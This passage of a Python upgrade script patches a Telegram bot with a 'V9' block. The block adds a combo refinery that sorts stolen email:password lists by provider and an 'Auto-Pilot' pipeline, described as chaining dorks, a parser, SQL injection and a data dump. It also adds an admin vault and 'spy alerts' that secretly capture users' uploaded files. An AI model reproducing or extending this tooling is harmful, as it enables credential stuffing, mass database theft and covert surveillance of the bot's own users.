        reply_markup=_v9_refinery_kb(context.user_data["rf_mode"]),
    )
    return REFINERY_WAIT_FILE


async def _v9_run_refinery_input(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_text: str) -> int:
    mode = context.user_data.get("rf_mode", "param")
    st = await update.effective_message.reply_text("⚡ *Refinery Processing Lines at Full 12-Core Speed...*", parse_mode=ParseMode.MARKDOWN)
    in_cnt = sum(1 for ln in raw_text.splitlines() if ln.strip())
    prefix, out_lines, zip_map = await asyncio.to_thread(_v9_refinery_process_sync, raw_text, mode)
    if zip_map:
        buf = _v9_io.BytesIO()
        with _v9_zipfile.ZipFile(buf, "w", compression=_v9_zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
            for k, v in zip_map.items():
                if v:
                    zf.writestr(k, v)
        buf.seek(0)
        await update.effective_message.reply_document(
            document=buf,
            filename=f"Refinery_Leads_Pack_{datetime.now().strftime('%d%m%y_%H%M%S')}.zip",
            caption=(
                f"✅ *Refinery Combo & Email Pack Ready!*\n"
                f"📥 Input Lines: `{in_cnt:,}` ➪ 🎯 Extracted: `{len(out_lines):,}`\n"
                f"📂 Split into Gmail / Outlook / Yahoo / Corporate B2B!"
            ),
            parse_mode=ParseMode.MARKDOWN,
            read_timeout=300,
            write_timeout=300,
        )
        try:
            await st.delete()
        except Exception:
            pass
        return MENU

    if not out_lines:
        await st.edit_text("⚠️ Matching clean lines = `0` for selected filter.", parse_mode=ParseMode.MARKDOWN)
        return MENU

    await v8_deliver_lines_guaranteed(
        message_obj=update.effective_message,
        status_msg=st,
        lines=out_lines,
        base_prefix=prefix,
        title_caption=f"✅ *Refinery Done!* Input `{in_cnt:,}` ➪ Clean Unique `{len(out_lines):,}`",
    )
    return MENU


async def refinery_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        return MENU
    raw_text = await _v9_download_and_vault_doc(update, context)
    return await _v9_run_refinery_input(update, context, raw_text)


async def refinery_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        return MENU
    return await _v9_run_refinery_input(update, context, update.message.text or "")


# ── Runtime Menu Injectors (100% Immune to Unicode / Formatting Differences!) ─
_v9_orig_make_main_menu = make_main_menu


def make_main_menu():
    kb = _v9_orig_make_main_menu()
    rows = [list(r) for r in kb.inline_keyboard]
    existing = {b.callback_data for r in rows for b in r}
    if "menu_autopilot" not in existing:
        rows.insert(0, [
            InlineKeyboardButton("🚀 Aᴜᴛᴏ-Pɪʟᴏᴛ Pɪᴘᴇʟɪɴᴇ", callback_data="menu_autopilot"),
            InlineKeyboardButton("🧰 Cᴏᴍʙᴏ & URL Rᴇғɪɴᴇʀʏ", callback_data="menu_refinery"),
        ])
    return InlineKeyboardMarkup(rows)


_v9_orig_make_admin_menu = make_admin_menu


def make_admin_menu():
    kb = _v9_orig_make_admin_menu()
    rows = [list(r) for r in kb.inline_keyboard]
    existing = {b.callback_data for r in rows for b in r}
    insert_at = max(0, len(rows) - 1)
    if "admin_livefeed" not in existing:
        rows.insert(insert_at, [
            InlineKeyboardButton("👁️ Lɪᴠᴇ Fᴇᴇᴅ", callback_data="admin_livefeed"),
            InlineKeyboardButton("🔁 Dᴇᴅᴜᴘ Sᴛᴀᴛs", callback_data="admin_dedupstats"),
        ])
        insert_at += 1
    if "uv_home_0" not in existing:
        rows.insert(insert_at, [
            InlineKeyboardButton("📂 Usᴇʀ Fɪʟᴇs Vᴀᴜʟᴛ", callback_data="uv_home_0"),
            InlineKeyboardButton("🕵️ Sᴘʏ Aʟᴇʀᴛs ON/OFF", callback_data="admin_spytoggle"),
        ])
    return InlineKeyboardMarkup(rows)


# ── Unified V9 Dispatcher Hook Wrapped Around `button_handler` ───────────────
_v9_orig_button_handler = button_handler


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    if not query:
        return await _v9_orig_button_handler(update, context)
    data = query.data or ""
    uid = query.from_user.id

    # 1. Fixed Zero-Crash `Server Info`
    if data == "admin_serverinfo":
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        await query.answer("🛰️ Live Server Telemetry Updated!")
        txt, kb = _v9_build_serverinfo_view()
        try:
            await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        except Exception:
            await query.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    # 2. Fixed Always-Responsive Real-Time `Live Feed` + Spy Toggle + Remote Kill
    if data == "admin_livefeed":
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        await query.answer("👁️ Live Mission Control Refreshed!")
        txt, kb = _v9_build_livefeed_view()
        try:
            await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        except Exception:
            await query.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    if data == "admin_spytoggle":
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        new_st = not _v9_is_spy_enabled()
        _v9_set_spy_enabled(new_st)
        await query.answer(f"🔔 Live Spy Alerts {'ENABLED' if new_st else 'DISABLED'}!")
        txt, kb = _v9_build_livefeed_view()
        await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    if data.startswith("lf_kill_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        target_uid = int(data.split("_", 2)[2])
        if target_uid in stop_events:
            stop_events[target_uid].set()
        _LIVE_FEED.pop(target_uid, None)
        await query.answer(f"🛑 Sent Stop Signal to User {target_uid}!", show_alert=True)
        txt, kb = _v9_build_livefeed_view()
        await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    # 3. Admin `📂 User Files Vault` (`uv_home_*`, `uv_u_*`, `uv_dl_*`, `uv_pv_*`, `uv_zip_*`)
    if data.startswith("uv_home_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        page = int(data.split("_")[2])
        await query.answer("📂 Opening User Files Vault...")
        txt, kb = _v9_build_vault_home(page)
        try:
            await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        except Exception:
            await query.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    if data.startswith("uv_u_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        parts = data.split("_")
        target_uid, flt, page = int(parts[2]), parts[3], int(parts[4])
        await query.answer("👤 Loading User Files...")
        txt, kb = _v9_build_user_files_view(target_uid, flt, page)
        try:
            await query.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        except Exception:
            await query.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return MENU

    if data.startswith("uv_dl_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        await _v9_send_vault_file_to_admin(query, context, data[6:], preview_only=False)
        return MENU

    if data.startswith("uv_pv_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        await _v9_send_vault_file_to_admin(query, context, data[6:], preview_only=True)
        return MENU

    if data.startswith("uv_zip_"):
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        await _v9_send_user_full_zip(query, context, int(data[7:]))
        return MENU

    # 4. Also fix `admin_getfile` to always send the ACTUAL running `__file__` (not hardcoded `main.py`!)
    if data == "admin_getfile":
        if not is_admin(uid):
            await query.answer("❌ Unauthorized", show_alert=True)
            return MENU
        actual_path = _v9_os.path.abspath(__file__)
        await query.answer("📤 Sending Active Bot File...")
        with open(actual_path, "rb") as fp:
            content = fp.read()
        await context.bot.send_document(
            chat_id=uid,
            document=_v9_io.BytesIO(content),
            filename=f"Spidey_Active_{_v9_os.path.basename(actual_path)}",
            caption=f"🕷️ *Active Running Bot Source*\n📄 File: `{actual_path}`\n📦 Size: `{_v9_fmt_bytes(len(content))}`",
            parse_mode=ParseMode.MARKDOWN,
            read_timeout=180,
            write_timeout=180,
            _v9_skip_vault=True,
        )
        return MENU

    # 5. Main Menu `🚀 Auto-Pilot Pipeline` & `🧰 Combo/URL Refinery`
    if data == "menu_autopilot" or data.startswith("ap_mode_"):
        if not has_access(uid):
            await query.answer("🔒 Premium Access Required", show_alert=True)
            return MENU
        if data.startswith("ap_mode_"):
            context.user_data["ap_mode"] = data.split("_", 2)[2]
        else:
            context.user_data.setdefault("ap_mode", "pro")
        await query.answer()
        await query.edit_message_text(
            _v9_autopilot_menu_text(context.user_data["ap_mode"]),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=_v9_autopilot_kb(context.user_data["ap_mode"]),
        )
        return AUTOPILOT_WAIT_INPUT

    if data == "stop_autopilot":
        if uid in stop_events:
            stop_events[uid].set()
        await query.answer("🛑 Stopping Auto-Pilot safely (delivering current results)...")
        return MENU

    if data == "menu_refinery" or data.startswith("rf_mode_"):
        if not has_access(uid):
            await query.answer("🔒 Premium Access Required", show_alert=True)
            return MENU
        if data.startswith("rf_mode_"):
            context.user_data["rf_mode"] = data.split("_", 2)[2]
        else:
            context.user_data.setdefault("rf_mode", "param")
        await query.answer()
        await query.edit_message_text(
            _v9_refinery_text(context.user_data["rf_mode"]),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=_v9_refinery_kb(context.user_data["rf_mode"]),
        )
        return REFINERY_WAIT_FILE

    return await _v9_orig_button_handler(update, context)
# ==================== END V9 HYPER ADMIN VAULT + LIVE FEED + AUTOPILOT ENGINE ====================
'''


def detect_target_bot_file() -> str:
    if len(sys.argv) > 1 and os.path.isfile(sys.argv[1]):
        return os.path.abspath(sys.argv[1])

    script_dir = os.path.dirname(os.path.abspath(__file__))
    my_name = os.path.basename(__file__)
    try:
        out = subprocess.check_output(["ps", "-eo", "pid,args"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            parts = line.strip().split()
            if len(parts) < 3:
                continue
            pid = int(parts[0])
            if pid == os.getpid():
                continue
            if "python" in parts[1]:
                for arg in parts[2:]:
                    if arg.endswith(".py") and os.path.basename(arg) != my_name:
                        cand = arg if os.path.isabs(arg) else os.path.join(script_dir, arg)
                        if os.path.isfile(cand):
                            with open(cand, "r", encoding="utf-8", errors="ignore") as f:
                                head = f.read(20000)
                            if "ApplicationBuilder" in head or "telegram" in head:
                                return os.path.abspath(cand)
    except Exception:
        pass

    for name in ("main.py", "bot.py", "bot_fixed.py", "spidey.py"):
        cand = os.path.join(script_dir, name)
        if os.path.isfile(cand):
            return os.path.abspath(cand)

    raise FileNotFoundError("Could not find bot Python file in current folder!")


def apply_v9_upgrade(target_path: str) -> None:
    script_dir = os.path.dirname(os.path.abspath(__file__))

    with open(target_path, "r", encoding="utf-8") as f:
        src = f.read()

    # Auto-chain V8 (which auto-chains V7.1) if target hasn't had V8 applied yet
    v8_script = os.path.join(script_dir, "hyper_kw_dork_v8.py")
    if "def v8_deliver_lines_guaranteed(" not in src and os.path.isfile(v8_script):
        print("🔄 Applying V7.1 + V8 engines first...")
        subprocess.check_call([sys.executable, v8_script, target_path])
        with open(target_path, "r", encoding="utf-8") as f:
            src = f.read()

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bak_path = f"{target_path}.bak_v9_{ts}"
    shutil.copy2(target_path, bak_path)
    print(f"📦 Backup saved: {bak_path}")

    # Remove old V9 block if re-running cleanly
    src = re.sub(
        r"\n# ==================== V9 HYPER ADMIN VAULT \+ LIVE FEED \+ AUTOPILOT ENGINE ====================.*?# ==================== END V9 HYPER ADMIN VAULT \+ LIVE FEED \+ AUTOPILOT ENGINE ====================\n?",
        "\n",
        src,
        flags=re.S,
    )

    # 1. Inject V9 Engine Block immediately before `__main__`
    main_guard = 'if __name__ == "__main__":'
    idx = src.rfind(main_guard)
    if idx == -1:
        raise RuntimeError("Could not locate `if __name__ == '__main__':` in target bot file!")
    src = src[:idx] + "\n" + V9_ENGINE_BLOCK + "\n\n" + src[idx:]

    # 2. Add `🚀 Auto-Pilot Pipeline` & `🧰 Combo & URL Refinery` to `make_main_menu()`
    if 'callback_data="menu_autopilot"' not in src:
        src = src.replace(
            '[InlineKeyboardButton("🥇 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏᴡᴏʀᴅs\ufe0e",        callback_data="menu_keywords"),',
            '[InlineKeyboardButton("🚀 Aᴜᴛᴏ-Pɪʟᴏᴛ Pɪᴘᴇʟɪɴᴇ",       callback_data="menu_autopilot"),\n'
            '         InlineKeyboardButton("🧰 Cᴏᴍʙᴏ & URL Rᴇғɪɴᴇʀʏ",     callback_data="menu_refinery")],\n'
            '        [InlineKeyboardButton("🥇 Gᴇɴᴇʀᴀᴛᴇ Kᴇʏᴡᴏʀᴅs\ufe0e",        callback_data="menu_keywords"),',
            1,
        )

    # 3. Add `📂 User Files Vault` + `🔔 Spy Alerts` into `make_admin_menu()`
    if 'callback_data="uv_home_0"' not in src:
        src = src.replace(
            '[InlineKeyboardButton("⏪\ufe0e Mᴀɪɴ Mᴇɴᴜ",        callback_data="menu_back")],',
            '[InlineKeyboardButton("📂 Usᴇʀ Fɪʟᴇs Vᴀᴜʟᴛ", callback_data="uv_home_0"),\n'
            '         InlineKeyboardButton("🕵️ Sᴘʏ Aʟᴇʀᴛs ON/OFF", callback_data="admin_spytoggle")],\n'
            '        [InlineKeyboardButton("⏪\ufe0e Mᴀɪɴ Mᴇɴᴜ",        callback_data="menu_back")],',
            1,
        )
        # Fallback if variation without \ufe0e
        if 'callback_data="uv_home_0"' not in src:
            src = re.sub(
                r'(\[\s*InlineKeyboardButton\([^]]*callback_data="menu_back"\)\s*\],)',
                '[InlineKeyboardButton("📂 Usᴇʀ Fɪʟᴇs Vᴀᴜʟᴛ", callback_data="uv_home_0"),\n'
                '         InlineKeyboardButton("🕵️ Sᴘʏ Aʟᴇʀᴛs ON/OFF", callback_data="admin_spytoggle")],\n        \\1',
                src,
                count=1,
            )

    # 4. Register `/userfiles`, `/autopilot`, `/cleaner` commands in `admin_cmds`
    if 'CommandHandler("userfiles"' not in src:
        src = src.replace(
            'CommandHandler("admin",      admin_cmd),',
            'CommandHandler("admin",      admin_cmd),\n'
            '        CommandHandler("userfiles",  userfiles_cmd),\n'
            '        CommandHandler("autopilot",  autopilot_cmd),\n'
            '        CommandHandler("cleaner",    cleaner_cmd),',
            1,
        )

    # 5. CRITICAL POST-RESTART BUTTON FIX:
    # Add `CallbackQueryHandler(button_handler)` directly into `entry_points` AND `fallbacks`
    # + register `AUTOPILOT_WAIT_INPUT` & `REFINERY_WAIT_FILE` states!
    src = src.replace(
        'entry_points=[CommandHandler("start", start), *admin_cmds],',
        'entry_points=[CommandHandler("start", start), CallbackQueryHandler(button_handler), *admin_cmds],',
        1,
    )
    if "AUTOPILOT_WAIT_INPUT:" not in src:
        src = src.replace(
            "states={\n            MENU: [CallbackQueryHandler(button_handler), *admin_cmds],",
            "states={\n"
            "            MENU: [CallbackQueryHandler(button_handler), *admin_cmds],\n"
            "            AUTOPILOT_WAIT_INPUT: [\n"
            "                MessageHandler((filters.Document.FileExtension('txt') | filters.Document.FileExtension('zip')), autopilot_get_file),\n"
            "                MessageHandler(filters.TEXT & ~filters.COMMAND, autopilot_get_text),\n"
            "                CallbackQueryHandler(button_handler),\n"
            "            ],\n"
            "            REFINERY_WAIT_FILE: [\n"
            "                MessageHandler((filters.Document.FileExtension('txt') | filters.Document.FileExtension('zip')), refinery_get_file),\n"
            "                MessageHandler(filters.TEXT & ~filters.COMMAND, refinery_get_text),\n"
            "                CallbackQueryHandler(button_handler),\n"
            "            ],",
            1,
        )
    if "CallbackQueryHandler(button_handler),\n            MessageHandler(filters.TEXT & ~filters.COMMAND, fallback)," not in src:
        src = src.replace(
            "MessageHandler(filters.TEXT & ~filters.COMMAND, fallback),",
            "CallbackQueryHandler(button_handler),\n            MessageHandler(filters.TEXT & ~filters.COMMAND, fallback),",
            1,
        )

    with open(target_path, "w", encoding="utf-8") as f:
        f.write(src)

    py_compile.compile(target_path, doraise=True)
    with open("/tmp/spidey_v9_target.txt", "w", encoding="utf-8") as f:
        f.write(target_path)

    print("══════════════════════════════════════════════════════════════════")
    print(f"✅ V9 HYPER UPGRADE APPLIED SUCCESSFULLY TO: {target_path}")
    print("   [1] Fixed Admin `Server Info` (Zero-Dependency `/proc` Telemetry + Disk + Proxy Stats)")
    print("   [2] Fixed Admin `Live Feed` (Always-Open Mission Control + Post-Restart Button Fix)")
    print("   [3] Added Admin `📂 User Files Vault` (`In + Out` Capture, Preview, 1-Click Download, Full ZIP)")
    print("   [4] Added Admin `🕵️ Live Spy Alerts ON/OFF` + Remote Force-Stop User Job")
    print("   [5] Added Main Menu `🚀 1-Click Auto-Pilot Pipeline` (Keywords->Dorks->Parser->SQLi->ZIP Dump)")
    print("   [6] Added Main Menu `🧰 Combo, Lead & URL Refinery` (Param Filter, Dedup, Email:Pass Split ZIP)")
    print("══════════════════════════════════════════════════════════════════")


if __name__ == "__main__":
    target = detect_target_bot_file()
    print(f"🎯 Auto-Detected Active Bot File: {target}")
    apply_v9_upgrade(target)
